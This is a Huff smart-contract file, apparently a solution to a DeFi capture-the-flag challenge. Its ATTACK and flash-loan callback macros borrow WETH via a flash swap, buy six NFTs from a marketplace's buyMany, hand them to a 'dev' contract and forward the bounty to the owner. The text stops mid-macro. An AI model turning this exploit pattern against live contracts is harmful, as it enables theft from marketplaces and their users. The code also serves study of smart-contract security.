// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant FACTORY_SLOT = FREE_STORAGE_POINTER()
#define constant MARKEPLACE_SLOT = FREE_STORAGE_POINTER()
#define constant WETH_SLOT = FREE_STORAGE_POINTER()
#define constant TOKEN_SLOT = FREE_STORAGE_POINTER()
#define constant NFT_SLOT = FREE_STORAGE_POINTER()
#define constant DEV_SLOT = FREE_STORAGE_POINTER()

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] - storage slot where to store msg.sender
    sstore          // [] - copied msg.sender to storage slot 0x00

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address

    // Copy constructor arguments into memory
    0x20            // [0x20] - size code we will copy (address)
    0xc0            // [0xc0, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0xc0, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    returndatasize  // [0x00, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> factory (1st constructor arg)

    0x20            // [0x20] - size code we will copy (address)
    0xa0            // [0xa0, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0xa0, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x20, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> factory (1st constructor arg)
    // [OFFSET 0x20]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> marketplace (2nd constructor arg)

    0x20            // [0x20] - size code we will copy (address)
    0x80            // [0x80, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x80, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x40, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> factory (1st constructor arg)
    // [OFFSET 0x20]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> marketplace (2nd constructor arg)
    // [OFFSET 0x40]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> weth (3rd constructor arg)

    0x20            // [0x20] - size code we will copy (address)
    0x60            // [0x60, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x60, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x60, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> factory (1st constructor arg)
    // [OFFSET 0x20]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> marketplace (2nd constructor arg)
    // [OFFSET 0x40]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> weth (3rd constructor arg)
    // [OFFSET 0x60]  000000000000000000000000BcF7FFFD8B256Ec51a36782a52D0c34f6474D951 -> token (4th constructor arg)

    0x20            // [0x20] - size code we will copy (address)
    0x40            // [0x40, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x40, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x80, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> factory (1st constructor arg)
    // [OFFSET 0x20]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> marketplace (2nd constructor arg)
    // [OFFSET 0x40]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> weth (3rd constructor arg)
    // [OFFSET 0x60]  000000000000000000000000BcF7FFFD8B256Ec51a36782a52D0c34f6474D951 -> token (4th constructor arg)
    // [OFFSET 0x80]  0000000000000000000000002bB5D9A5770233476B14978DF7e7dE17209c37Ac -> nft (5th constructor arg)

    0x20            // [0x20] - size code we will copy (address)
    dup1            // [0x20, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x20, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0xa0, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000f2df0b975c0c9efa2f8ca0491c2d1685104d2488 -> factory (1st constructor arg)
    // [OFFSET 0x20]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> marketplace (2nd constructor arg)
    // [OFFSET 0x40]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> weth (3rd constructor arg)
    // [OFFSET 0x60]  000000000000000000000000BcF7FFFD8B256Ec51a36782a52D0c34f6474D951 -> token (4th constructor arg)
    // [OFFSET 0x80]  0000000000000000000000002bB5D9A5770233476B14978DF7e7dE17209c37Ac -> nft (5th constructor arg)
    // [OFFSET 0xa0]  000000000000000000000000F7F78379391C5dF2Db5B66616d18fF92edB82022 -> dev (6th constructor arg)

    // Copy constructor argsuments from memory into storage slots
    returndatasize  // [0x00] - byte offset in memory
    mload           // [factory] - copied factory onto stack from byte offset 0x00 in mem
    [FACTORY_SLOT]  // [0x01, factory] - storage slot where to store factory
    sstore          // [] - copied factory to storage slot 0x01

    // STORAGE:
    // [SLOT 0x00]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01]  000000000000000000000000F2Df0b975c0C9eFa2f8CA0491C2d1685104d2488 -> factory address (1st constructor arg)

    0x20              // [0x20] - byte offset in memory
    mload             // [marketplace] - copied marketplace onto stack from byte offset 0x20 in mem
    [MARKEPLACE_SLOT] // [0x02, marketplace] - storage slot where to store marketplace
    sstore            // [] - copied marketplace to storage slot 0x02

    // STORAGE:
    // [SLOT 0x00]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01]  000000000000000000000000F2Df0b975c0C9eFa2f8CA0491C2d1685104d2488 -> factory address (1st constructor arg)
    // [SLOT 0x02]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> marketplace address (2nd) constructor arg)

    0x40              // [0x40] - byte offset in memory
    mload             // [weth] - copied weth onto stack from byte offset 0x40 in mem
    [WETH_SLOT]       // [0x03, weth] - storage slot where to store weth
    sstore            // [] - copied weth to storage slot 0x03

    // STORAGE:
    // [SLOT 0x00]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01]  000000000000000000000000F2Df0b975c0C9eFa2f8CA0491C2d1685104d2488 -> factory address (1st constructor arg)
    // [SLOT 0x02]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> marketplace address (2nd) constructor arg)
    // [SLOT 0x03]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> weth (3rd constructor arg)

    0x60              // [0x60] - byte offset in memory
    mload             // [token] - copied token onto stack from byte offset 0x60 in mem
    [TOKEN_SLOT]      // [0x04, token] - storage slot where to store token
    sstore            // [] - copied token to storage slot 0x04

    // STORAGE:
    // [SLOT 0x00]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01]  000000000000000000000000F2Df0b975c0C9eFa2f8CA0491C2d1685104d2488 -> factory address (1st constructor arg)
    // [SLOT 0x02]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> marketplace address (2nd) constructor arg)
    // [SLOT 0x03]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> weth (3rd constructor arg)
    // [SLOT 0x04]  000000000000000000000000BcF7FFFD8B256Ec51a36782a52D0c34f6474D951 -> token (4th constructor arg)

    0x80              // [0x80] - byte offset in memory
    mload             // [nft] - copied nft onto stack from byte offset 0x80 in mem
    [NFT_SLOT]        // [0x05, nft] - storage slot where to store nft
    sstore            // [] - copied nft to storage slot 0x05

    // STORAGE:
    // [SLOT 0x00]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01]  000000000000000000000000F2Df0b975c0C9eFa2f8CA0491C2d1685104d2488 -> factory address (1st constructor arg)
    // [SLOT 0x02]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> marketplace address (2nd) constructor arg)
    // [SLOT 0x03]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> weth (3rd constructor arg)
    // [SLOT 0x04]  000000000000000000000000BcF7FFFD8B256Ec51a36782a52D0c34f6474D951 -> token (4th constructor arg)
    // [SLOT 0x05]  0000000000000000000000002bB5D9A5770233476B14978DF7e7dE17209c37Ac -> nft (5th constructor arg)

    0xa0              // [0xa0] - byte offset in memory
    mload             // [dev] - copied nft onto stack from byte offset 0xa0 in mem
    [DEV_SLOT]        // [0x06, dev] - storage slot where to store dev
    sstore            // [] - copied dev to storage slot 0x06

    // STORAGE:
    // [SLOT 0x00]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01]  000000000000000000000000F2Df0b975c0C9eFa2f8CA0491C2d1685104d2488 -> factory address (1st constructor arg)
    // [SLOT 0x02]  000000000000000000000000fd7aC01F633E6873Fb360BF04daEEf97cAEB7815 -> marketplace address (2nd) constructor arg)
    // [SLOT 0x03]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> weth (3rd constructor arg)
    // [SLOT 0x04]  000000000000000000000000BcF7FFFD8B256Ec51a36782a52D0c34f6474D951 -> token (4th constructor arg)
    // [SLOT 0x05]  0000000000000000000000002bB5D9A5770233476B14978DF7e7dE17209c37Ac -> nft (5th constructor arg)
    // [SLOT 0x06]  000000000000000000000000F7F78379391C5dF2Db5B66616d18fF92edB82022 -> dev (6th constructor arg)
}

// Modifiers
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(1) returns (0) {
    // takes: [borrow_amt]

    // Copy `getPair(address,address)` func sig and params into mem to use as calldata for STATICCALL
    0xe6a43905      // [0xe6a43905, borrow_amt] - func sig
    0x80            // [0x80, 0xe6a43905, borrow_amt] - byte offset in mem
    mstore          // [borrow_amt] - copied func sig into mem at offset 0x80

    [WETH_SLOT]     // [0x03, borrow_amt] - storage slot where weth is
    sload           // [weth, borrow_amt - copied weth onto stack from storage slot 0x03
    0xa0            // [0xa0, weth, borrow_amt] - byte offset in mem
    mstore          // [borrow_amt] - copied weth into mem at offset 0xa0

    [TOKEN_SLOT]    // [0x04, borrow_amt] - storage slot where token is
    sload           // [token, borrow_amt] - copied token onto stack from storage slot 0x04
    0xc0            // [0xc0, token, borrow_amt] - byte offset in mem
    mstore          // [borrow_amt] - copied token into mem at offset 0xc0

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x40]  0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x60]  0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x80]  00000000000000000000000000000000000000000000000000000000e6a43905 -> `getPair(address,address)` func sig
    // [OFFSET 0xa0]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> weth address
    // [OFFSET 0xc0]  000000000000000000000000BcF7FFFD8B256Ec51a36782a52D0c34f6474D951 -> token address

    // STATICCALL into factory
    0x20            // [0x20, borrow_amt] - size of return data (address)
    0xc0            // [0xc0, 0x20, borrow_amt] - byte offset in mem where return data is copied
    0x44            // [0x44, 0xc0, 0x20, borrow_amt] - size off calldata
    0x9c            // [0x9c, 0x44, 0xc0, 0x20, borrow_amt] - byte offset in mem where calldata starts
    [FACTORY_SLOT]  // [0x01, 0x9c, 0x44, 0xc0, 0x20, borrow_amt] - storage slot where factory is
    sload           // [factory, 0x9c, 0x44, 0xc0, 0x20, borrow_amt] - copied factory onto stack from storage slot 0x01
    gas             // [gas, factory, 0x9c, 0x44, 0xc0, 0x20, borrow_amt] - gas to send with staticcall
    staticcall      // [success, borrow_amt]
    iszero          // [0/1, borrow_amt]
    throw_error     // [throw_error, 0/1, borrow_amt]
    jumpi           // [borrow_amt]

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x40]  0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x60]  0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x80]  00000000000000000000000000000000000000000000000000000000e6a43905 -> `getPair(address,address)` func sig
    // [OFFSET 0xa0]  000000000000000000000000274b028b03A250cA03644E6c578D81f019eE1323 -> weth address
    // [OFFSET 0xc0]  0000000000000000000000002Aa3DB64D4245077181DFb9d7c20fa823F044FD0 -> return data (pair address)

    // Check return data to verify the pair exists
    0xc0            // [0xc0, borrow_amt] - byte offset in mem
    mload           // [pair, borrow_amt] - copied return data (pair) onto stack
    dup1            // [pair, pair, borrow_amt] - duplicated pair to use for future CALL
    iszero          // [0/1, pair, borrow_amt]
    throw_error     // [throw_error, 0/1, pair, borrow_amt]
    jumpi           // [pair, borrow_amt]


    // Copy `swap(address,address,uint256,bytes)` func sig and params into mem to use as calldata for CALL
    // the last param for `swap` is of type bytes so we will build out the calldata for this dynamic type
    0x22c0d9f       // [0x22c0d9f, pair, borrow_amt] - func sig
    0x00            // [0x00, 0x22c0d9f, pair, borrow_amt] - byte offset in mem
    mstore          // [pair, borrow_amt] - copied func sig into mem at offset 0x00
    
    swap1           // [borrow_amt, pair]
    returndatasize  // [0x20, borrow_amt, pair] - byte offset in mem
    mstore          // [pair] - copied borrow_amt into mem at offset 0x20

    address         // [self, pair]
    0x60            // [0x60, self, pair] - byte offset in mem
    mstore          // [pair] - copied self into mem at offset 0x60

    0x80            // [0x80, pair] - bytes param offset
    dup1            // [0x80, 0x80, pair] - byte offset in mem
    mstore          // [pair] - copied bytes param offset into mem at offset 0x80

    returndatasize  // [0x20, pair] - bytes param length
    0xa0            // [0xa0, 0x20, pair] - byte offset in mem
    mstore          // [pair] - copied bytes param length into mem at offset 0xa0

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000022c0d9f -> `swap(uint256,uint256,address,bytes)` func sig
    // [OFFSET 0x20]  000000000000000000000000000000000000000000000000D02AB486CEDC0000 -> borrow amount
    // [OFFSET 0x40]  0000000000000000000000000000000000000000000000000000000000000000 -> empty
    // [OFFSET 0x60]  0000000000000000000000006B63B0441371ddFbD65A65Ef27642e7A622f29dD -> self
    // [OFFSET 0x80]  0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    // [OFFSET 0xa0]  0000000000000000000000000000000000000000000000000000000000000020 -> bytes param length
    // [OFFSET 0xc0]  0000000000000000000000002Aa3DB64D4245077181DFb9d7c20fa823F044FD0 -> return data (pair address)

    // CALL into pair
    0x00             // [0x00, pair] - size of return data
    dup1             // [0x00, 0x00, pair] - byte offset in mem where return data is copied
    0xc4             // [0xc4, 0x00, 0x00, pair] - size of calldata
    0x1c             // [0x1c, 0xc4, 0x00, 0x00, pair] - byte offset in mem where calldata starts
    dup3             // [0x00, 0x1c, 0xc4, 0x00, 0x00, pair] - msg.value to send with call
    dup6             // [pair, 0x00, 0x1c, 0xc4, 0x00, 0x00, pair] - calling pair
    gas              // [gas, pair, 0x00, 0x1c, 0xc4, 0x00, 0x00, pair] - gas to send with call
    call             // [success, pair]
    iszero           // [0/1, pair]
    throw_error      // [throw_error, 0/1, pair]
    jumpi            // [pair]
    pop              // []

    // Send owner eth received from marketplace and bounty
    0x00             // [0x00] - size of return data
    dup1             // [0x00, 0x00] - byte offset in mem where return data is copied
    dup1             // [0x00, 0x00, 0x00] - size of calldata
    dup1             // [0x00, 0x00, 0x00, 0x00] - byte offset in mem where calldata starts
    selfbalance      // [self_bal, 0x00, 0x00, 0x00, 0x00] - bounty received
    caller           // [owner, self_bal, 0x00, 0x00, 0x00, 0x00] - msg.ender is owner due to modifier
    gas              // [gas, owner, self_bal, 0x00, 0x00, 0x00, 0x00] - gas to send with call
    call             // [success]
    iszero           // [0/1]
    throw_error      // [throw_error, 0/1]
    jumpi            // []

    stop
}

// FLash loan callback function
#define macro UNI_CALLBACK() = takes(3) returns (0) {
    // takes: [pair, amount, sender]

    // Verify that caller is pair
    dup1             // [pair, pair, amount, sender] - duplicate to use for future CALL
    caller           // [caller, pair, pair, amount, sender] - msg.sender
    xor              // [xor_value, pair, amount, sender] - will push 0 if items are equal
    throw_error      // [throw_error, xor_value, pair, amount, sender]
    jumpi            // [pair, amount, sender]

    // Verify that self is equal to sender param
    swap2            // [sender, amount, pair]
    address          // [self, sender, amount, pair]
    xor              // [xor_value, amount, pair]
    throw_error      // [throw_error, xor_value, amount, pair]
    jumpi            // [amount, pair]

    // Copy `withdraw(uint256)` func sig and amount into mem to use as calldata for CALL
    0x2e1a7d4d       // [0x2e1a7d4d, amount, pair] - func sig
    msize            // [0x00, 0x2e1a7d4d, amount, pair] - byte offset in mem
    mstore           // [amount, pair] - copied func sig into mem at offset 0x00

    dup1             // [amount, amount, pair] - duplicate amount to use for future calls and calculations
    msize            // [0x20, amount, amount, pair] - byte offset in mem
    mstore           // [amount, pair] - copied amount in memory at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000000000000000000000000000000000002e1a7d4d -> `withdraw(uint256)` func sig
    // [OFFSET 0x20]  000000000000000000000000000000000000000000000000D02AB486CEDC0000 -> amount (uint256)

    // CALL into weth
    [WETH_SLOT]     // [0x03, amount, pair] - storage slot where weth is
    sload           // [weth, amount, pair] - copied weth onto stack from storage slot 0x03
    0x00            // [0x00, weth, amount, pair] - size of return data
    dup1            // [0x00, 0x00, weth, amount, pair] - byte offset in mem where return data is copied
    0x24            // [0x24, 0x00, 0x00, weth, amount, pair] - size of calldata
    0x1c            // [0x1c, 0x24 0x00, 0x00, weth, amount, pair] - byte offset in mem where calldata starts
    dup3            // [0x00, 0x1c, 0x24, 0x00, 0x00, weth, amount, pair] - msg.value to send with call
    dup6            // [weth, 0x00, 0x1c, 0x24, 0x00, 0x00, weth, amount, pair] - calling weth
    gas             // [gas, weth, 0x00, 0x1c, 0x24, 0x00, 0x00, weth, amount, pair] - gas to send with call
    call            // [success, weth, amount, pair]
    iszero          // [0/1, weth, amount, pair]
    throw_error     // [throw_error, 0/1, weth, amount, pair]
    jumpi           // [weth, amount, pair]

    // Copy `buyMany(uint256[])` func sig and params into mem to use as calldata for CALL
    // param is a dynamic array so we will build out the calldata for this dynamic type
    0x779cc9d0      // [0x779cc9d0, weth, amount, pair] - func sig
    0x00            // [0x00, 0x779cc9d0, weth, amount, pair] - byte offset in mem
    mstore          // [weth, amount, pair] - copied func sig into mem at offset 0x00

    0x20            // [0x20, weth, amount, pair] - array offset
    dup1            // [0x20, 0x20, weth, amount, pair] - byte offset in mem
    mstore          // [weth,amount, pair] - copied array offset in mem at offset 0x20

    0x06            // [0x06, weth, amount, pair] - array length
    msize           // [0x40, 0x06, weth, amount, pair] - byte offset in mem 
    mstore          // [weth, amount, pair] - copied array length into mem at offset 0x40

    0x00            // [0x00, weth, amount, pair] - 1st item in array
    msize           // [0x60, 0x00, weth, amount, pair] - byte offset in mem
    mstore          // [weth, amount, pair] - copied item into mem at offset 0x60

    0x01            // [0x01, weth, amount, pair] - 2nd item in array
    msize           // [0x80, 0x01, weth, amount, pair] - byte offset in mem
    mstore          // [weth, amount, pair] - copied item into mem at offset 0x80

    0x02            // [0x02, weth, amount, pair] - 3rd item in array
    msize           // [0xa0, 0x02, weth, amount, pair] - byte offset in mem
    mstore          // [weth, amount, pair] - copied item into mem at offset 0xa0

    0x03            // [0x03, weth, amount, pair] - 4th item in array
    msize           // [0xc0, 0x03, weth, amount, pair] - byte offset in mem
    mstore          // [weth, amount, pair] - copied item into mem at offset 0xc0

    0x04            // [0x04, weth, amount, pair] - 5th item in array
    msize           // [0xe0, 0x04, weth, amount, pair] - byte offset in mem
    mstore          // [weth, amount, pair] - copied item into mem at offset 0xe0

    0x05            // [0x05, weth, amount, pair] - 6th item in array
    msize           // [0x100, 0x05, weth, amount, pair] - byte offset in mem
    mstore          // [weth, amount, pair] - copied item into mem at offset 0x100

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000779cc9d0 -> `buyMany(uint256[])` func sig
    // [OFFSET 0x20]   0000000000000000000000000000000000000000000000000000000000000020 -> array offset
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000006 -> array length
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> item 1
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000001 -> item 2
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000002 -> item 3
    // [OFFSET 0xc0]   0000000000000000000000000000000000000000000000000000000000000003 -> item 4
    // [OFFSET 0xe0]   0000000000000000000000000000000000000000000000000000000000000004 -> item 5
    // [OFFSET 0x100]  0000000000000000000000000000000000000000000000000000000000000005 -> item 6

    // CALL into marketplace
    0x00              // [0x00, weth, amount, pair] - size of return data
    dup1              // [0x00, 0x00, weth, amount, pair] - byte offset in mem where return data is copied
    0x104             // [0x104, 0x00, 0x00, weth, amount, pair] - size of calldata
    0x1c              // [0x1c, 0x104, 0x00, 0x00, weth, amount, pair] - byte offset in mem where calldata starts
    dup6              // [amount 0x1c, 0x104, 0x00, 0x00, weth, amount, pair] - msg.value to send with call
    [MARKEPLACE_SLOT] // [0x02, amount, 0x1c, 0x104, 0x00, 0x00, weth, amount, pair] - storage slot where marketplace is
    sload             // [marketplace, amount, 0x1c, 0x104, 0x00, 0x00, weth, amount, pair] - calling marketplace
    gas               // [gas, marketplace, amount, 0x1c, 0x104, 0x00, 0x00, weth, amount, pair] - gas to send with call
    call              // [success, weth, amount, pair]
    iszero            // [0/1, weth, amount, pair]
    throw_error       // [throw_error, 0/1, weth, amount, pair]
    jumpi             // [weth, amount, pair]

    // Copy `safeTransferFrom` func sig and params into mem to prep for CALL 
    // Last param is of type bytes so we will build the calldata for this dynamic type
    // Each call will happen while we loop through the array in mem
    0xb88d4fde        // [0xb88d4fde, weth, amount, pair] - func sig
    msize             // [0x120, 0xb88d4fde, weth, amount, pair] - byte offset in mem
    mstore            // [weth, amount, pair] - copied func sig into mem at offset 0x120

    address           // [self, weth, amount, pair]
    dup1              // [self, self, weth, amount, pair]
    msize             // [0x140, self, self, weth, amount, pair] - byte offset in mem
    mstore            // [self, weth, amount, pair] - copied self into mem at offset 0x140

    [DEV_SLOT]        // [0x06, self, weth, amount, pair] - storage slot where dev contract is
    sload             // [dev, self, weth, amount, pair] - copied dev onto stack from storage slot 0x06
    msize             // [0x160, dev, self, weth, amount, pair] - byte offset in mem
    mstore            // [self, weth, amount, pair] - copied dev into mem at offset 0x160
    
    0x80              // [0x80, self, weth, amount, pair] - bytes param offset
    0x1a0             // [0x1a0, 0x80, self, weth, amount, pair] - byte offset in mem
    mstore            // [self, weth, amount, pair] - copied bytes param offset into mem at offset 0x1a0

    0x20              // [0x20, self, weth, amount, pair] - bytes param length
    msize             // [0x1c0, 0x20, self, weth, amount, pair] - byte offset in mem
    mstore            // [self, weth, amount, pair] - copied bytes param length into mem at offset 0x1c0

    msize             // [0x1e0, self, weth, amount, pair] - byte offset in mem
    mstore            // [weth, amount, pair]

    // MEMORY:
    // [OFFSET 0x00]   00000000000000000000000000000000000000000000000000000000779cc9d0 -> `buyMany(uint256[])` func sig
    // [OFFSET 0x20]   0000000000000000000000000000000000000000000000000000000000000020 -> array offset
    // [OFFSET 0x40]   0000000000000000000000000000000000000000000000000000000000000006 -> array length
    // [OFFSET 0x60]   0000000000000000000000000000000000000000000000000000000000000000 -> item 1
    // [OFFSET 0x80]   0000000000000000000000000000000000000000000000000000000000000001 -> item 2
    // [OFFSET 0xa0]   0000000000000000000000000000000000000000000000000000000000000002 -> item 3
    // [OFFSET 0xc0]   0000000000000000000000000000000000000000000000000000000000000003 -> item 4
    // [OFFSET 0xe0]   0000000000000000000000000000000000000000000000000000000000000004 -> item 5
    // [OFFSET 0x100]  0000000000000000000000000000000000000000000000000000000000000005 -> item 6
    // [OFFSET 0x120]  00000000000000000000000000000000000000000000000000000000b88d4fde -> `safeTransferFrom` func sig
    // [OFFSET 0x140]  0000000000000000000000006B63B0441371ddFbD65A65Ef27642e7A622f29dD -> self
    // [OFFSET 0x160]  000000000000000000000000F7F78379391C5dF2Db5B66616d18fF92edB82022 -> dev
    // [OFFSET 0x180]  0000000000000000000000000000000000000000000000000000000000000000 -> empty (token ids go here)
    // [OFFSET 0x1a0]  0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
    // [OFFSET 0x1c0]  0000000000000000000000000000000000000000000000000000000000000020 -> bytes param length
    // [OFFSET 0x1e0]  0000000000000000000000006B63B0441371ddFbD65A65Ef27642e7A622f29dD -> bytes param value (self)

    [NFT_SLOT]        // [0x05, weth, amount, pair] - storage slot where nft is
    sload             // [nft, weth, amount, pair] - copied nft onto stack from storage slot 0x05
    0x00              // [index, nft, weth, amount, pair] - index
    0x40              // [prev_offset, index, nft, weth, amount, pair] - used to calc offset

    // Loop through each item in array and CALL into nft
    // Ommitting weth, amount, and pair in stack for simplicity. 
    loop:
        0x20          // [0x20, prev_offset, index, nft] - 32 bytes
        add           // [offset, index, nft] - get offset of array[index]
        dup1          // [offset, offset, index, nft]
        mload         // [item, offset, index, nft] - copied item onto stack from offset
        0x180         // [0x180, item, offset, index, nft] - byte offset in mem
        mstore        // [offset, index, nft] - copied item into mem at offset 0x180

        // MEMORY:
        // ...
        // [OFFSET 0x120]  00000000000000000000000000000000000000000000000000000000b88d4fde -> `safeTransferFrom` func sig
        // [OFFSET 0x140]  0000000000000000000000006B63B0441371ddFbD65A65Ef27642e7A622f29dD -> self
        // [OFFSET 0x160]  000000000000000000000000F7F78379391C5dF2Db5B66616d18fF92edB82022 -> dev
        // [OFFSET 0x180]  0000000000000000000000000000000000000000000000000000000000000000 -> array[index]
        // [OFFSET 0x1a0]  0000000000000000000000000000000000000000000000000000000000000080 -> bytes param offset
        // [OFFSET 0x1c0]  0000000000000000000000000000000000000000000000000000000000000020 -> bytes param length
        // [OFFSET 0x1e0]  0000000000000000000000006B63B0441371ddFbD65A65Ef27642e7A622f29dD -> bytes param value (self)

        // CALL into nft
        0x00          // [0x00, offset, index, nft] - size of return data
        dup1          // [0x00, 0x00, offset, index, nft] - byte offset in mem where return data is copied
        0xc4          // [0xc4, 0x00, 0x00, offset, index, nft] - size of calldata
        0x13c         // [0x13c, 0xc4, 0x00, 0x00, offset, index, nft] - byte offset in mem where calldata starts
        dup3          // [0x00, 0x13c, 0xc4, 0x00, 0x00, offset, index, nft] - msg.value to send with call
        dup8          // [nft, 0x00, 0x13c, 0xc4, 0x00, 0x00, offset, index, nft] - calling nft
        gas           // [gas, nft, 0x00, 0x13c, 0xc4, 0x00, 0x00, offset, index, nft] - gas to send with call
        call          // [success, offset, index, nft] 
        iszero        // [0/1, offset, index, nft]
        throw_error   // [throw_error, 0/1, offset, index, nft]
        jumpi         // [offset, index, nft]
    
        // Increment index
        swap1         // [index, offset, nft]
        0x01          // [0x01, index, offset, nft]
        add           // [new_index, offset, nft] - increment index by one
        swap1         // [offset, new_index, nft]
        dup2          // [new_index, offset, new_index, nft]
        0x06          // [0x06, new_index, offset, new_index, nft]
        gt            // [0/1, offset, new_index, nft] - compare new_index with length of array
        loop          // [loop, 0/1, offset, new_index, nft]
        jumpi         // [offset, new_index, nft] - continue loop if we did not go through each item in the array. If we did continue execution below
        pop           // [new_index, nft]
        pop           // [nft]
        pop           // [] - remember our actual stack looks like this: [weth, amount, pair]
        
    // calculate repay amount for flash loan
    swap1             // [amount, weth, pair]
    0x01              // [0x01, amount, weth, pair]
